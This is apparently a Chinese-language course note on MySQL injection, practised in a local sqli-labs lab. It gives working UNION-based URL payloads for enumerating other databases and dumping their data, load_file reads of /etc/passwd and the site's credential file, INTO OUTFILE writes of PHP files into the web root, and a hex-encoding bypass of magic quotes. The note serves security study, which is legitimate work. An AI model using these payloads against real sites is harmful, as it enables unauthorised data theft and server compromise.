![mysql注入-小迪.png](https://s2.loli.net/2022/11/25/ED9khnGvJ6TjsWR.png)





### 一、information_schema

information_schema 数据库跟 performance_schema 一样，都是 MySQL 自带的信息数据库。其中 performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。

information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。

- **SCHEMATA****表**

当前 mysql 实例中所有数据库的信息。SHOW DATABASES; 命令从这个表获取数据



获取到数据库名称

```bash
mysql> use information_schema;
mysql> select SCHEMA_NAME,DEFAULT_CHARACTER_SET_NAME from SCHEMATA;
+--------------------+----------------------------+
| SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME |
+--------------------+----------------------------+
| information_schema | utf8                       |
| challenges         | gbk                        |
| mysql              | latin1                     |
| performance_schema | utf8                       |
| security           | gbk                        |
+--------------------+----------------------------+
```

- TABLES 表

存储数据库中的表信息（包括视图），包括表属于哪个数据库，表的类型、存储引擎、创建时间等信息。SHOW TABLES FROM XX; 命令从这个表获取结果。

```bash
mysql> select TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME from tables limit 0,5;
+---------------+--------------------+---------------------------------------+
| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME                            |
+---------------+--------------------+---------------------------------------+
| def           | information_schema | CHARACTER_SETS                        |
| def           | information_schema | COLLATIONS                            |
| def           | information_schema | COLLATION_CHARACTER_SET_APPLICABILITY |
| def           | information_schema | COLUMNS                               |
| def           | information_schema | COLUMN_PRIVILEGES                     |
+---------------+--------------------+---------------------------------------+
5 rows in set (0.00 sec)
```

- COLUMNS 表

存储表中的列信息，包括表有多少列、每个列的类型等。SHOW COLUMNS FROM schemaname.tablename 命令从这个表获取结果。

```bash
mysql> SELECT TABLE_CATALOG,TABLE_SCHEMA,TABLE_NAME FROM COLUMNS LIMIT 2,5;
+---------------+--------------------+----------------+
| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME     |
+---------------+--------------------+----------------+
| def           | information_schema | CHARACTER_SETS |
| def           | information_schema | CHARACTER_SETS |
| def           | information_schema | COLLATIONS     |
| def           | information_schema | COLLATIONS     |
| def           | information_schema | COLLATIONS     |
+---------------+--------------------+----------------+
```

- USER_PRIVILEGES 表

用户权限表。内容源自 mysql.user 授权表。是非标准表。

```bash
mysql> SELECT * FROM USER_PRIVILEGES limit 0,5;
+--------------------+---------------+----------------+--------------+
| GRANTEE            | TABLE_CATALOG | PRIVILEGE_TYPE | IS_GRANTABLE |
+--------------------+---------------+----------------+--------------+
| 'root'@'localhost' | def           | SELECT         | YES          |
| 'root'@'localhost' | def           | INSERT         | YES          |
| 'root'@'localhost' | def           | UPDATE         | YES          |
| 'root'@'localhost' | def           | DELETE         | YES          |
| 'root'@'localhost' | def           | CREATE         | YES          |
+--------------------+---------------+----------------+--------------+
5 rows in set (0.00 sec)
```

### 二、跨库攻击

```
在同一个数据库管理系统中，
在一个数据库中存在某个sql注入漏洞，并且权限为root，可以以此去操作另一个数据库
进行夸库攻击
```

前提准备   （获取最高权限进行跨库攻击）

```bash
mysql> create database book;
mysql> use book;
mysql> CREATE TABLE IF NOT EXISTS book(    `book_id` INT UNSIGNED AUTO_INCREMENT,    `book_title` VARCHAR(100) NOT NULL,    `book_author` VARCHAR(40) NOT NULL,    `submission_date` DATE,    PRIMARY KEY ( `book_id` ) )ENGINE=InnoDB DEFAULT CHARSET=utf8;
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| book               |
| mysql              |
| performance_schema |
+--------------------+
mysql> use book;
mysql> show tables;
+----------------+
| Tables_in_book |
+----------------+
| book           |
+----------------+
1 row in set (0.00 sec)

mysql> desc book;
+-----------------+------------------+------+-----+---------+----------------+
| Field           | Type             | Null | Key | Default | Extra          |
+-----------------+------------------+------+-----+---------+----------------+
| book_id         | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
| book_title      | varchar(100)     | NO   |     | NULL    |                |
| book_author     | varchar(40)      | NO   |     | NULL    |                |
| submission_date | date             | YES  |     | NULL    |                |
+-----------------+------------------+------+-----+---------+----------------+
4 rows in set (0.00 sec)
```

打开网页进行查询当前数据库的用户

```
?id=-1%20union%20select%201,user(),3
```

![img](https://s2.loli.net/2022/11/25/stzVK5AucI2LRSd.png)
 			可以看到当前用户为root拥有最高的权限。



获取到当前网页的数据库名`?id=-1%20union%20select%201,database(),3`

![img](https://s2.loli.net/2022/11/25/dsBDoHtPSWACGMn.png)

获取到当前网站的数据库是security

- 常见的数据库与用户的对应关系

```bash
数据库A=网站A=数据库用户A	——>表名——>列名——>数据
数据库B=网站B=数据库用户B	——>表名——>列名——>数据
数据库C=网站C=数据库用户C	——>表名——>列名——>数据
```

**备注：**这样的好处一个用户对应一个库、这样网站之间的数据互不干扰，当然这是最基础的数据库模型，现在大网站都是分布式数据库。

- 在数据库中查询有哪些用户

```bash
mysql> use mysql;
Database changed
mysql> select host,user,password from user;
+--------------+------+----------+
| host         | user | password |
+--------------+------+----------+
| localhost    | root |          |
| 2c8a2316583a | root |          |
| 127.0.0.1    | root |          |
| ::1          | root |          |
+--------------+------+----------+
4 rows in set (0.00 sec)

mysql>
```

在源码中查看使用的是哪一个用户

```bash
root@2c8a2316583a:/var/www/html# cat sql-connections/db-creds.inc
<?php

//give your mysql connection username n password
$dbuser ='root';
$dbpass ='';
$dbname ="security";
$host = 'localhost';
$dbname1 = "challenges";
?>
```

一般在网站安装的时候会指定数据库的用户名和密码这里指定的是root用户密码为空指定的数据库是security

 跨库查询的前提条件是必须**高权限**的用户才能执行跨库查询。

```
?id=-1%20union%20select%201,schema_name,3%20from%20information_schema.schemata
```

![img](https://s2.loli.net/2022/11/25/4KhSxm3j7VgMTtz.png)

数据库中执行

```bash
mysql> SELECT * FROM users WHERE id=-1 union select 1,schema_name,3 from information_schema.schemata LIMIT 0,1;
+----+--------------------+----------+
| id | username           | password |
+----+--------------------+----------+
|  1 | information_schema | 3        |
+----+--------------------+----------+
1 row in set (0.00 sec)

mysql>
```

- 1、获取到所有的数据库名称

```
union select 1,group_concat(schema_name),3 from information_schema.schemata
```

备注：GROUP_CONCAT函数将分组中的字符串与各种选项进行连接。  

![img](https://s2.loli.net/2022/11/25/yYGAPNhOX9oQ7MK.png)

等同于在数据库中执行以下命令

```bash
mysql> use security;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SELECT * FROM users WHERE id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata  LIMIT 0,1;
+----+----------------------------------------------------------------------+----------+
| id | username                                                             | password |
+----+----------------------------------------------------------------------+----------+
|  1 | information_schema,book,challenges,mysql,performance_schema,security | 3        |
+----+----------------------------------------------------------------------+----------+
1 row in set (0.00 sec)

mysql>
```

- 2、指定获取book库中的表名信息

![img](https://s2.loli.net/2022/11/25/RwEG42nazi6VHtQ.png)`union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='book'`



等同于在数据库中执行以下命令

```bash
mysql> SELECT * FROM users WHERE id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='book'  LIMIT 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | book     | 3        |
+----+----------+----------+
1 row in set (0.00 sec)

mysql>
```

- 3、获取指定数据库book下的book表的列名信息

![img](https://s2.loli.net/2022/11/25/Tm2M95lzIoZKcaU.png)

```
union select 1,group_concat(column_name),3 from information_schema.columns where table_name='book' and table_schema='book'
```

等同于以下的数据库命令

```bash
mysql> use security;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> SELECT * FROM users WHERE id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='book' and table_schema='book'  LIMIT 0,1;
+----+------------------------------------------------+----------+
| id | username                                       | password |
+----+------------------------------------------------+----------+
|  1 | book_id,book_title,book_author,submission_date | 3        |
+----+------------------------------------------------+----------+
1 row in set (0.00 sec)

mysql>
```

- 4、查询到指定数据

![img](https://s2.loli.net/2022/11/25/I75x8FwsoA9Tdbp.png)

```bash
mysql> SELECT * FROM users WHERE id=-1 union  select book_id,book_title,book_author from book.book  LIMIT 0,1;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Linux    | oldjiang |
+----+----------+----------+
1 row in set (0.00 sec)

mysql>
```

**备注：**username和password字段是users表中的字段，又因为查询到的数据为空执行后面的联合字句的时候将内容填充到下面所以获取到的内容并不是十分准确，另外要内容十分准确必须要满足book表和user表的结构完全相同

### 三、文件读写函数

参考地址：https://www.sqlsec.com/2020/11/mysql.html

**load_file**											 文件读取

**into outfile** 或 **into dumpfile**		文件写入



查询是否有写入的权限

```bash
mysql> show global variables like '%secure_file_priv%';
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

| Value | 说明                       |
| ----- | -------------------------- |
| NULL  | 不允许导入或导出           |
| /tmp  | 只允许在 /tmp 目录导入导出 |
| 空    | 不限制目录                 |

在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件

在 MySQL 5.5之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件

- 文件读取

```bash
mysql> select load_file('/etc/passwd')\G;
*************************** 1. row ***************************
load_file('/etc/passwd'): root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:105:MySQL Server,,,:/nonexistent:/bin/false

1 row in set (0.00 sec)

ERROR:
No query specified

mysql>
```

读取敏感信息：https://blog.csdn.net/weixin_30292843/article/details/99381669

在网站上面读取内容:`?id=-2%20union%20select%201,load_file(%27/etc/passwd%27),3`

![img](https://s2.loli.net/2022/11/25/dHj6NV9YB3skueT.png)

读取数据库的配置信息

```
?id=-1%20union%20select%201,load_file(%27/var/www/html/sql-connections/db-creds.inc%27),3
```

![img](https://s2.loli.net/2022/11/25/Z3U8swQPd5bXEIC.png)

右击查看源代码

![img](https://s2.loli.net/2022/11/25/6BXZ3fnCU4vmoy2.png)

- 文件写入

```bash
mysql> select '<?php phpinfo() ?>' into outfile './php';
Query OK, 1 row affected (0.00 sec)

mysql>
root@06026a1599f9:/# cat /var/lib/mysql/php
<?php phpinfo() ?>

mysql> select '<?php phpinfo() ?>' into outfile '/var/www/php';
ERROR 1 (HY000): Can't create/write to file '/var/www/php' (Errcode: 13)
mysql>
```

在linux中默认是对/var/lib/mysql目录下有写入权限对其他目录是没有写入权限。

对目录修改权限测试

```bash
mysql> select '<?php phpinfo() ?>' into outfile '/var/www/html/test.php';
ERROR 1 (HY000): Can't create/write to file '/var/www/html/test.php' (Errcode: 13)
mysql> \q
root@06026a1599f9:/# chmod -Rf 777 /var/www/html/
root@06026a1599f9:/# mysql
mysql> select '<?php phpinfo() ?>' into outfile '/var/www/html/test.php';
mysql>
```



在网页上写入

![img](https://s2.loli.net/2022/11/25/rVWtAyl2Jjk7RGw.png)

```bash
root@06026a1599f9:/var/lib/mysql# pwd
/var/lib/mysql
root@06026a1599f9:/var/lib/mysql# ls -l test.php
-rw-rw-rw- 1 mysql mysql 23 Jun 18 12:17 test.php
root@06026a1599f9:/var/lib/mysql# cat test.php
1       <?php phpinfo() ?>      3
root@06026a1599f9:/var/lib/mysql#
```

### 四、魔术引号开关

   魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，对单引号、双引号、反斜线、NULL加上一个一个反斜线进行转义，这个的作用跟addslashes()的作用完全相同。



  	正确地接收和读取数据，从而正确地执行SQL语句，防止恶意的SQL注入。

​        简单的SQL注入示例，假设有一个数据库user，我们要传一个参数查询某个用户的信息，我们会调用某个接口，传一个参数给接口，类似于http://域名/?c=xxx&a=xxx&user=xxx，现在我们想查询一个叫codeman的人的信息，那么user=codeman，后台接收到参数之后，执行类似于下面的SQL语句。

```bash
SELECT * FROM `user` WHERE `user` = 'codeman';
```

​        如果在接收数据时后台不进行转义，那么久可能让恶意的SQL注入攻击发生，假设我们现在传递一个user=codeman'or'1'='1，传到后台执行的SQL语句变成：

```bash
SELECT * FROM `user` WHERE `user` = 'codeman' or '1' or '1';
```

 为什么在PHP5.4.0及其之后PHP版本中被取消了呢？  

```bash
PHP 5.5.9-1ubuntu4.13 (cli) (built: Sep 29 2015 15:24:49)
Copyright (c) 1997-2014 The PHP Group
Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies
root@06026a1599f9:/# grep magic /etc/php5/apache2/php.ini
root@06026a1599f9:/# grep magic /etc/php5/cli/php.ini
```

(1)可移植性:

编程时认为其打开或并闭都会影响到移植性。可以用 get_magic_quotes_gpc() 来检查是否打开，并据此编程。 



(2）性能

​        由于并不是每一段被转义的数据都要插入数据库的，如果所有进入 PHP 的数据都被转义的话，那么会对程序的执行效率产生一定的影响。在运行时调用转义函数（如 addslashes()）更有效率。 尽管 php.ini-dist 默认打开了这个选项，但是 php.ini-recommended 默认却关闭了它，主要是出于性能的考虑。

 

（3）方便

由于不是所有数据都需要转义，在不需要转义的地方看到转义的数据就很烦。比如说通过表单发送邮件，结果看到一大堆的 '。针对这个问题，可以使用 stripslashes() 函数处理。[


](https://blog.csdn.net/hyh1123176978/article/details/53893579)

**phpstudy环境中PHP版本选择为5.2.17时在php.ini文件中魔术引号的开关**

![img](https://s2.loli.net/2022/11/25/Yf2njH1QygP4oza.png)

选择SQL注入的关卡1阅读源码`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`这一句中我们要是想注入的话必须让前面的`’`闭合，但是我们开启了魔术引号开关我发生这样的事情。

![img](https://s2.loli.net/2022/11/25/3YK75y1ENovXDtM.png)

就是在我们注入的时候添加的`’`会在之后会自动添加`\'`将我们注入语句给注释掉从而失败。将魔术引号关闭之后然后重启phpstudy就可以正常的注入。

![img](https://s2.loli.net/2022/11/25/XyQaPeukpRfq2sV.png)

![img](https://s2.loli.net/2022/11/25/zHYq4Sly9sNDmKP.png)

由于docker搭建的环境是PHP5.5版本的没有魔术引号、故不做演示

开启了魔术引号之后

![img](https://s2.loli.net/2022/11/25/Ikte8ZyF5fCROEg.png)

**绕过方法**

采用hex(16进制)编码绕过因为对路径进行编码之后魔术引号不会再对其生效也就是说绕过了魔术引号的作用达到绕过。

编码软件:winhex

### 五、int函数

对输入的数字进行判断是否

```bash
if(is_int($id)){
	$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
	echo $sql;
	$result=mysql_query($sql);
}else{
	echo 'ni shi ge jj?';
}
```

![img](https://s2.loli.net/2022/11/25/z9XPR241TvUOWly.png)



防护软件一般也是对关键字进行防护、触发了waf等安全软件规则会将数据包丢弃。

